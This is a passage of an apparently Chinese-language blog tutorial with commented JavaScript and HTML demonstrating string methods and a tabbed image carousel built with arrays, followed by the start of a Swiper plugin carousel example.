class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>js字符串 数组方法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">            * &#123;</span><br><span class="line"><span class="css">                <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">list-style</span>: none;</span></span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">            .content &#123;</span><br><span class="line"><span class="css">                <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">width</span>: <span class="number">800px</span>;</span></span><br><span class="line"><span class="css">                <span class="comment">/* box-shadow: 0 0 2px 0 red; */</span></span></span><br><span class="line"><span class="css">                <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="css">                <span class="attribute">left</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">top</span>: <span class="number">100px</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">            .nav &#123;</span><br><span class="line"><span class="css">                <span class="attribute">width</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.192</span>);</span></span><br><span class="line"><span class="css">                <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">                <span class="attribute">z-index</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">245</span>, <span class="number">245</span>, <span class="number">245</span>, <span class="number">0.747</span>);</span></span><br><span class="line">        </span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line"><span class="css">            <span class="selector-class">.nav</span>&gt;<span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">height</span>: <span class="number">133px</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">width</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="css">                <span class="attribute">padding</span>: <span class="number">40px</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">                <span class="comment">/* line-height: 130px; */</span></span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.589</span>);</span></span><br><span class="line"><span class="css">                <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="css">                <span class="attribute">z-index</span>: <span class="number">20</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">transition</span>: .<span class="number">8s</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line"><span class="css">            <span class="selector-class">.nav</span>&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.637</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">            .content .img_contain &#123;</span><br><span class="line"><span class="css">                <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">                <span class="comment">/* box-shadow: 0 0 2px 0 blue; */</span></span></span><br><span class="line"><span class="css">                <span class="attribute">display</span>: none;</span></span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line"><span class="css">            <span class="selector-class">.img_contain</span>&gt;<span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">                <span class="comment">/* opacity: 0; */</span></span></span><br><span class="line"><span class="css">                <span class="attribute">transition</span>: <span class="number">0.8s</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="css">        <span class="comment">/* 将图片放在html中，使用js数组调用图片，数组中存放文件路径 */</span></span></span><br><span class="line">            /* .img_contain:nth-of-type(2)&gt;li:nth-of-type(1) &#123;</span><br><span class="line"><span class="css">                <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/1.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">            &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/2.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">            &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>) &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/3.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">            &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/4.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">            &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/5.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">            &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>) &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/6.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">            &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">4</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/7.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">            &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">4</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/8.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">            &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">4</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>) &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/9.jpg</span>) no-repeat center/cover;</span></span><br><span class="line">            &#125; */</span><br><span class="line">        </span><br><span class="line"><span class="css">            <span class="selector-tag">div</span>&gt;<span class="selector-tag">ol</span> &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">width</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">height</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">                <span class="attribute">left</span>: <span class="number">350px</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="css">                <span class="comment">/* color:white; */</span></span></span><br><span class="line"><span class="css">                <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="css">                <span class="attribute">justify-content</span>: space-around;</span></span><br><span class="line"><span class="css">                <span class="comment">/* display需要与justify-content一起使用，发挥效果 */</span></span></span><br><span class="line">        </span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line"><span class="css">            <span class="selector-tag">ol</span>&gt;<span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">width</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">height</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.233</span>);</span></span><br><span class="line"><span class="css">                <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">            .cls &#123;</span><br><span class="line"><span class="css">                <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.74</span>);</span></span><br><span class="line"><span class="css">                <span class="attribute">border-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 静态页面，使用day17页面代码 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 存放选项卡轮播图的容器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 选项卡 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>集美<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>鬼刀<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>风景<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 图片容器 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 虽然有三个选项卡，day17使用3个轮播图，这里只需要用一个即可，因为js中用数组可以存储多张图片路径 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;img_contain&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: block;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/1.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>  <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">style</span>=<span class="string">&quot;object-fit:cover; opacity: 1;&quot;</span>&gt;</span></span><br><span class="line">                 <span class="comment">&lt;!-- width=默认&quot;auto&quot;  --&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/2.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">style</span>=<span class="string">&quot;object-fit:cover;&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- object-fit配合height和width一起用实现cover的效果 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/3.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">style</span>=<span class="string">&quot;object-fit:cover;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 分页器小点 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 知识点：字符串方法</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//选项卡套轮播图 利用数组的方法</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//凡是左右两侧用单引号或双引号包裹的都是字符串</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> txt = <span class="string">&quot;wo cao&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> txt); <span class="comment">//string</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//length  长度，数组也有length属性</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(txt.length); <span class="comment">//6，空格也算</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//查找字符串 indexOf()正序查找  lastIndexOf()倒序查找</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(txt.indexOf(<span class="string">&quot;wo&quot;</span>)); <span class="comment">//0 返回wo起始下标</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(txt.indexOf(<span class="string">&quot;o&quot;</span>)); <span class="comment">//1 只返回匹配值第一个的下标</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(txt.indexOf(<span class="string">&quot;b&quot;</span>)); <span class="comment">//-1 找不到就-1</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(txt.indexOf(<span class="string">&quot;hhh&quot;</span>)) <span class="comment">//-1 不存在该字符串</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//应用：-1查无此人</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> txtt = <span class="string">&quot;wo shi xiao yao 233 !!!&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(txtt.lastIndexOf(<span class="string">&quot;o&quot;</span>)); <span class="comment">//14 从后向前找，返回找到匹配的第一个元素的下标值</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//截取字符串  slice() 一个或两个参数，两个分别代表初始和结束位置</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//substring()不支持负数下标  substr()</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ttxt = <span class="string">&quot;Matlab is cool !!&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ttxt.slice(<span class="number">1</span>,<span class="number">3</span>)); <span class="comment">//at 前闭后开</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ttxt.slice(<span class="number">3</span>)); <span class="comment">//lab is cool !!从参数位置开始一直截取到末尾</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ttxt.slice(-<span class="number">9</span>,-<span class="number">3</span>)); <span class="comment">// s cool此时下标坐标轴原点在最末尾，负值在左，同样绝对值大的下标不包含</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ttxt.substring(<span class="number">2</span>,<span class="number">8</span>)); <span class="comment">//table i 与slic（）就是substring()不支持负数</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ttxt.substr(<span class="number">2</span>,<span class="number">7</span>)); <span class="comment">//tlab is从下标为2开始截取7个字符，包括空格</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ttxt.substr(<span class="number">2</span>)); <span class="comment">//从下标2开始到最后</span></span></span><br><span class="line">        </span><br><span class="line"><span class="javascript">        <span class="comment">//replace()替换</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ttxt.replace(<span class="string">&quot;Matlab&quot;</span>,<span class="string">&quot;Linux&quot;</span>)); <span class="comment">//返回 linux is cool !!</span></span></span><br><span class="line">        </span><br><span class="line"><span class="javascript">        <span class="comment">//toUpperCase() 大写   tolowerCase() 小写</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ttxt.toUpperCase());</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ttxt.toLowerCase());</span></span><br><span class="line"><span class="javascript">        <span class="comment">//应用场景 事件委托，比如li标签在实践委托后会变LI大写，这时候需要转回小写</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//trim()删除空白部分    该函数有兼容性问题，IE8以及以下不兼容</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ttt=<span class="string">&quot;   car  1  &quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ttt.trim()); <span class="comment">//car   1 只能消除两端的空格，中间的不删除</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//兼容性问题，很多时候要考虑个别用户，还会用低版本的，比如html css3中的弹性盒也是不支持</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//字符串--》转数组      应用：本地存储时，需要将字符串和数组之间有转换</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ttx=<span class="string">&quot;123,345,124&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(txt.split(<span class="string">&quot;,&quot;</span>)); <span class="comment">//按照逗号来分割字符串</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ttx.split(<span class="string">&quot;|&quot;</span>)); <span class="comment">//字符串中没有|，所以不会分割，仍然为一个</span></span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//===========================================</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//用数组实现轮播图</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//二维数组</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> img_src = [</span></span><br><span class="line"><span class="javascript">            <span class="comment">//三组图片路径数据</span></span></span><br><span class="line"><span class="javascript">            [<span class="string">&quot;./img/1.jpg&quot;</span>, <span class="string">&quot;./img/2.jpg&quot;</span>, <span class="string">&quot;./img/3.jpg&quot;</span>],</span></span><br><span class="line"><span class="javascript">            [<span class="string">&quot;./img/4.jpg&quot;</span>, <span class="string">&quot;./img/5.jpg&quot;</span>, <span class="string">&quot;./img/6.jpg&quot;</span>],</span></span><br><span class="line"><span class="javascript">            [<span class="string">&quot;./img/7.jpg&quot;</span>, <span class="string">&quot;./img/8.jpg&quot;</span>, <span class="string">&quot;./img/9.jpg&quot;</span>]</span></span><br><span class="line">        ];</span><br><span class="line"><span class="javascript">        <span class="comment">//获取元素</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> img_contain = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;img_contain&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> imgs = img_contain.getElementsByTagName(<span class="string">&quot;img&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> nav = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;nav&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> nav_li = nav.getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ol = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;ol&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ol_li = ol.getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(imgs.length)</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;nav_li.length;i++)&#123;</span></span><br><span class="line">            nav_li[i].index=i;</span><br><span class="line"><span class="javascript">            nav_li[i].onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;imgs.length;j++)&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 也可写成 j&lt;img_src[this.index][j] 更灵活</span></span></span><br><span class="line"><span class="javascript">                    imgs[j].src=img_src[<span class="built_in">this</span>.index][j];</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> timer;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> theimg=<span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        timer = <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">            theimg++;</span><br><span class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;imgs.length;i++)&#123;</span></span><br><span class="line">                imgs[i].style.opacity=0;</span><br><span class="line"><span class="javascript">                ol_li[i].className=<span class="string">&quot;&quot;</span>;            </span></span><br><span class="line">            &#125;</span><br><span class="line">            if(theimg&gt;=imgs.length)&#123;</span><br><span class="line">                theimg=0;</span><br><span class="line">            &#125;</span><br><span class="line">            imgs[theimg].style.opacity=1;</span><br><span class="line"><span class="javascript">            ol_li[theimg].className=<span class="string">&quot;cls&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(theimg);</span></span><br><span class="line">        &#125;, 2000);</span><br><span class="line"></span><br><span class="line"><span class="javascript">        img_contain.onmouseover = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">clearInterval</span>(timer);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        img_contain.onmouseout=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            timer=<span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">                theimg++;</span><br><span class="line"><span class="javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;imgs.length;i++)&#123;</span></span><br><span class="line">                    imgs[i].style.opacity=0;</span><br><span class="line"><span class="javascript">                    ol_li[i].className=<span class="string">&quot;&quot;</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line">                if(theimg&gt;=imgs.length)&#123;</span><br><span class="line">                    theimg=0;</span><br><span class="line">                &#125;</span><br><span class="line">                imgs[theimg].style.opacity=1;</span><br><span class="line"><span class="javascript">                ol_li[theimg].className=<span class="string">&quot;cls&quot;</span>;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// console.log(theimg);</span></span></span><br><span class="line">            &#125;,2000)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="swiper插件快速造轮播图"><a href="#swiper插件快速造轮播图" class="headerlink" title="swiper插件快速造轮播图"></a>swiper插件快速造轮播图</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>利用swiper插件快速制作轮播图<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span 